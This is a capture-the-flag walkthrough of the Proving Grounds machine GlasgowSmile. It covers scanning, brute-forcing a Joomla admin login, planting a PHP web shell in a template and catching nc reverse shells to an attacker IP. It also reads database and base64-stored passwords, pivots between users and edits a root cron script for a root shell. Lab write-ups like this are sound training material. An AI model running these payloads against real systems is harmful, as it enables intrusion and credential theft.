---
layout: default
title: GlasgowSmile
parent: Proving Grounds Play
nav_order: 33
---

# Scanning

---

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/glasgowsmile]
└─$ sudo nmap -Pn -p- -sC -sV -T4 --open 192.168.202.79
Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-18 21:35 EST
Nmap scan report for 192.168.202.79
Host is up (0.074s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 67:34:48:1f:25:0e:d7:b3:ea:bb:36:11:22:60:8f:a1 (RSA)
|   256 4c:8c:45:65:a4:84:e8:b1:50:77:77:a9:3a:96:06:31 (ECDSA)
|_  256 09:e9:94:23:60:97:f7:20:cc:ee:d6:c1:9b:da:18:8e (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.38 (Debian)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 30.38 seconds
```

# Enumeration

---

## 80 | HTTP

Gobuster returns _/joomla_ which is basic looking Joomla site.

![index](../../../assets/images/ctfs/proving_grounds/glasgowsmile/index.png)

Install and run the _joomscan_ tool.

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/glasgowsmile]
└─$ sudo apt-get install joomscan

```

_/robots.txt_

```bash
User-agent: *
Disallow: /administrator/
Disallow: /bin/
Disallow: /cache/
Disallow: /cli/
Disallow: /components/
Disallow: /includes/
Disallow: /installation/
Disallow: /language/
Disallow: /layouts/
Disallow: /libraries/
Disallow: /logs/
Disallow: /modules/
Disallow: /plugins/
Disallow: /tmp/
```

_/joomla/administrator_

![admin](../../../assets/images/ctfs/proving_grounds/glasgowsmile/admin.png)

### Brute force the Joomla admin login

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/glasgowsmile]
└─$ cewl http://192.168.202.79/joomla/ -w joker.txt
CeWL 5.5.2 (Grouping) Robin Wood (robin@digi.ninja) (https://digi.ninja/)

```

Using the username _joomla_ we brute force in with the password _Gotham_

![password](../../../assets/images/ctfs/proving_grounds/glasgowsmile/password.png)

![logon](../../../assets/images/ctfs/proving_grounds/glasgowsmile/logon.png)

# Exploitation

---

## Exploit Protostar Template for Reverse Shell

Select Templates > Templates > ProtoStar

![protostar](../../../assets/images/ctfs/proving_grounds/glasgowsmile/protostar.png)

Create new file.

![new](../../../assets/images/ctfs/proving_grounds/glasgowsmile/new.png)

![file](../../../assets/images/ctfs/proving_grounds/glasgowsmile/file.png)

Use the following PHP web shell one-liner.

```bash
<?= system($_GET['cmd']); ?>
```

![cmd](../../../assets/images/ctfs/proving_grounds/glasgowsmile/cmd.png)

![id](../../../assets/images/ctfs/proving_grounds/glasgowsmile/id.png)

Generate the revshell and urlencode

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/glasgowsmile]
└─$ revshellgen -i 192.168.45.217 -p 9001 -t nc-mknod

[+] Reverse shell command:

rm /tmp/l;mknod /tmp/l p;/bin/sh 0</tmp/l | nc 192.168.45.217 9001 1>/tmp/l

┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/glasgowsmile]
└─$ urlencode "rm /tmp/l;mknod /tmp/l p;/bin/sh 0</tmp/l | nc 192.168.45.217 9001 1>/tmp/l"
rm%20%2Ftmp%2Fl%3Bmknod%20%2Ftmp%2Fl%20p%3B%2Fbin%2Fsh%200%3C%2Ftmp%2Fl%20%7C%20nc%20192.168.45.217%209001%201%3E%2Ftmp%2Fl

```

Run the following payload in the URL

```bash
http://192.168.202.79/joomla/templates/protostar/cmd.php?cmd=rm%20%2Ftmp%2Fl%3Bmknod%20%2Ftmp%2Fl%20p%3B%2Fbin%2Fsh%200%3C%2Ftmp%2Fl%20%7C%20nc%20192.168.45.217%209001%201%3E%2Ftmp%2Fl
```

We get a reverse shell

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/glasgowsmile]
└─$ nc -nlvp 9001
listening on [any] 9001 ...
connect to [192.168.45.217] from (UNKNOWN) [192.168.202.79] 37924
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

```

# Post-Exploitation

---

## Check Configuration File

```bash
www-data@glasgowsmile:/var/www/html/joomla$ cat configuration.php
<?php
class JConfig {
        public $offline = '0';
        public $offline_message = 'This site is down for maintenance.<br />Please check back again soon.
';
        public $display_offline_message = '1';
        public $offline_image = '';
        public $sitename = 'Joker';
        public $editor = 'tinymce';
        public $captcha = '0';
        public $list_limit = '20';
        public $access = '1';
        public $debug = '0';
        public $debug_lang = '0';
        public $dbtype = 'mysqli';
        public $host = 'localhost';
        public $user = 'joomla';
        public $password = 'babyjoker';
        public $db = 'joomla_db';
        public $dbprefix = 'jnqcu_';
        public $live_site = '';

```

Logon to MySQL servie with the creds _joomla:babyjoker_

```bash
www-data@glasgowsmile:/var/www/html/joomla$ mysql -ujoomla -p
Enter password:
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 495
Server version: 10.3.22-MariaDB-0+deb10u1 Debian 10

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| batjoke            |
| information_schema |
| joomla_db          |
| mysql              |
| performance_schema |
+--------------------+
5 rows in set (0.002 sec)

MariaDB [(none)]> use bakjoke;
ERROR 1049 (42000): Unknown database 'bakjoke'
MariaDB [(none)]> use batjoke;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [batjoke]> show tables;
+-------------------+
| Tables_in_batjoke |
+-------------------+
| equipment         |
| taskforce         |
+-------------------+
2 rows in set (0.000 sec)

MariaDB [batjoke]> select * from equipment
    -> ;
Empty set (0.000 sec)

MariaDB [batjoke]> select * from equipment;
Empty set (0.000 sec)

MariaDB [batjoke]> select * from taskforce;
+----+---------+------------+---------+----------------------------------------------+
| id | type    | date       | name    | pswd                                         |
+----+---------+------------+---------+----------------------------------------------+
|  1 | Soldier | 2020-06-14 | Bane    | YmFuZWlzaGVyZQ==                             |
|  2 | Soldier | 2020-06-14 | Aaron   | YWFyb25pc2hlcmU=                             |
|  3 | Soldier | 2020-06-14 | Carnage | Y2FybmFnZWlzaGVyZQ==                         |
|  4 | Soldier | 2020-06-14 | buster  | YnVzdGVyaXNoZXJlZmY=                         |
|  6 | Soldier | 2020-06-14 | rob     | Pz8/QWxsSUhhdmVBcmVOZWdhdGl2ZVRob3VnaHRzPz8/ |
|  7 | Soldier | 2020-06-14 | aunt    | YXVudGlzIHRoZSBmdWNrIGhlcmU=                 |
+----+---------+------------+---------+----------------------------------------------+
6 rows in set (0.000 sec)
```

The base64 encoded strings resove to the following:

```bash
bane:baneishere
Aaron:aaronishere
Carnage:carnageishere
buster:busterishereff
rob:???AllIHaveAreNegativeThoughts???
aunt:auntis the fuck here
```

## Pivot to Rob User

Discover _Abnerineedyourhelp_ file in _/home/rob_

```bash
rob@glasgowsmile:~$ cat Abnerineedyourhelp
Gdkkn Cdzq, Zqsgtq rteedqr eqnl rdudqd ldmszk hkkmdrr ats vd rdd khsskd rxlozsgx enq ghr bnmchshnm. Sghr qdkzsdr sn ghr eddkhmf zants adhmf hfmnqdc. Xnt bzm ehmc zm dmsqx hm ghr intqmzk qdzcr, "Sgd vnqrs ozqs ne gzuhmf z ldmszk hkkmdrr hr odnokd dwodbs xnt sn adgzud zr he xnt cnm's."
Mnv H mddc xntq gdko Zamdq, trd sghr ozrrvnqc, xnt vhkk ehmc sgd qhfgs vzx sn rnkud sgd dmhflz. RSLyzF9vYSj5aWjvYFUgcFfvLCAsXVskbyP0aV9xYSgiYV50byZvcFggaiAsdSArzVYkLZ==

```

This is a Rot encoded file...Rot1 specifically.

![rot1](../../../assets/images/ctfs/proving_grounds/glasgowsmile/ro1.png)

The MD5 encoded string resolves to the password _I33hope99my0death000makes44more8cents00than0my0life0_ for the _abner_ user.

## Pivot to Abner

Check the contents of _/home/penguin_

We have read access to the contents of _/home/penguin/SomeoneWhoHidesBehindAMask_

```bash
abner@glasgowsmile:~$ ls -la /home/penguin/SomeoneWhoHidesBehindAMask/
ls: cannot access '/home/penguin/SomeoneWhoHidesBehindAMask/.': Permission denied
ls: cannot access '/home/penguin/SomeoneWhoHidesBehindAMask/user3.txt': Permission denied
ls: cannot access '/home/penguin/SomeoneWhoHidesBehindAMask/find': Permission denied
ls: cannot access '/home/penguin/SomeoneWhoHidesBehindAMask/PeopleAreStartingToNotice.txt': Permission denied
ls: cannot access '/home/penguin/SomeoneWhoHidesBehindAMask/..': Permission denied
ls: cannot access '/home/penguin/SomeoneWhoHidesBehindAMask/.trash_old': Permission denied
total 0
d????????? ? ? ? ?            ? .
d????????? ? ? ? ?            ? ..
-????????? ? ? ? ?            ? find
-????????? ? ? ? ?            ? PeopleAreStartingToNotice.txt
-????????? ? ? ? ?            ? .trash_old
-????????? ? ? ? ?            ? user3.txt

```

Look for files that we have write access to.

```bash
abner@glasgowsmile:~$ find / -writable 2>/dev/null
/home/abner
/home/abner/user2.txt
/home/abner/.bashrc
/home/abner/.Xauthority
/home/abner/.bash_logout
/home/abner/.profile
/home/abner/.ssh
/home/abner/.ssh/known_hosts
/tmp
/var/www/joomla2/administrator/manifests/files/.dear_penguins.zip
/var/tmp
```

Copy the file to the pwd and attempt to unzip but requires a password.

```bash
abner@glasgowsmile:~$ unzip .dear_penguins.zip
Archive:  .dear_penguins.zip
[.dear_penguins.zip] dear_penguins password:
  inflating: dear_penguins
abner@glasgowsmile:~$ ls
dear_penguins  user2.txt
abner@glasgowsmile:~$ cat dear_penguins
My dear penguins, we stand on a great threshold! It's okay to be scared; many of you won't be coming back. Thanks to Batman, the time has come to punish all of God's children! First, second, third and fourth-born! Why be biased?! Male and female! Hell, the sexes are equal, with their erogenous zones BLOWN SKY-HIGH!!! FORWAAAAAAAAAAAAAARD MARCH!!! THE LIBERATION OF GOTHAM HAS BEGUN!!!!!
scf4W7q4B4caTMRhSFYmktMsn87F35UkmKttM5Bz

```

## Pivot to Penguin User

The creds are _penguin:scf4W7q4B4caTMRhSFYmktMsn87F35UkmKttM5Bz_

The script _.trash_old_ should execute with root permissions.

```bash
penguin@glasgowsmile:~/SomeoneWhoHidesBehindAMask$ ls -la
total 332
drwxr--r-- 2 penguin penguin   4096 Nov 18 22:03 .
drwxr-xr-x 5 penguin penguin   4096 Nov 18 21:59 ..
-rwSr----- 1 penguin penguin 315904 Jun 15  2020 find
-rw-r----- 1 penguin root      1457 Jun 15  2020 PeopleAreStartingToNotice.txt
-rwxr-xr-x 1 penguin root       662 Nov 18 22:03 .trash_old
-rw-r----- 1 penguin penguin     32 Aug 25  2020 user3.txt

```

Assuming this is probably being executed by _root_ on a cron job, let's edit and add a command that creates a _rootbash_ script with root privileges.

![rootbash](../../../assets/images/ctfs/proving_grounds/glasgowsmile/rootbash.png)

```bash
penguin@glasgowsmile:~/SomeoneWhoHidesBehindAMask$ cat .trash_old
#/bin/sh

#       (            (              )            (      *    (   (
# (      )\ )   (     )\ ) (      ( /( (  (       )\ ) (  `   )\ ))\ )
# )\ )  (()/(   )\   (()/( )\ )   )\()))\))(   ' (()/( )\))( (()/(()/( (
#(()/(   /(_)((((_)(  /(_)(()/(  ((_)\((_)()\ )   /(_)((_)()\ /(_)/(_)))\
# /(_))_(_))  )\ _ )\(_))  /(_))_  ((__(())\_)() (_)) (_()((_(_))(_)) ((_)
#(_)) __| |   (_)_\(_/ __|(_)) __|/ _ \ \((_)/ / / __||  \/  |_ _| |  | __|
#  | (_ | |__  / _ \ \__ \  | (_ | (_) \ \/\/ /  \__ \| |\/| || || |__| _|
#   \___|____|/_/ \_\|___/   \___|\___/ \_/\_/   |___/|_|  |_|___|____|___|
#

#

cp /usr/bin/bash /tmp/rootbash
chmod +s /tmp/rootbash

exit 0

```

This is not working for some reason, so we will send a reverse shell with root privileges to our attack machine.

```bash
#/bin/sh

#       (            (              )            (      *    (   (
# (      )\ )   (     )\ ) (      ( /( (  (       )\ ) (  `   )\ ))\ )
# )\ )  (()/(   )\   (()/( )\ )   )\()))\))(   ' (()/( )\))( (()/(()/( (
#(()/(   /(_)((((_)(  /(_)(()/(  ((_)\((_)()\ )   /(_)((_)()\ /(_)/(_)))\
# /(_))_(_))  )\ _ )\(_))  /(_))_  ((__(())\_)() (_)) (_()((_(_))(_)) ((_)
#(_)) __| |   (_)_\(_/ __|(_)) __|/ _ \ \((_)/ / / __||  \/  |_ _| |  | __|
#  | (_ | |__  / _ \ \__ \  | (_ | (_) \ \/\/ /  \__ \| |\/| || || |__| _|
#   \___|____|/_/ \_\|___/   \___|\___/ \_/\_/   |___/|_|  |_|___|____|___|
#

#

nc -e /bin/bash 192.168.45.217 9001

exit 0


```

After a minute we get a reverse shell as root

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/glasgowsmile]
└─$ nc -nlvp 9001
listening on [any] 9001 ...
connect to [192.168.45.217] from (UNKNOWN) [192.168.202.79] 37926
whoami
root

```
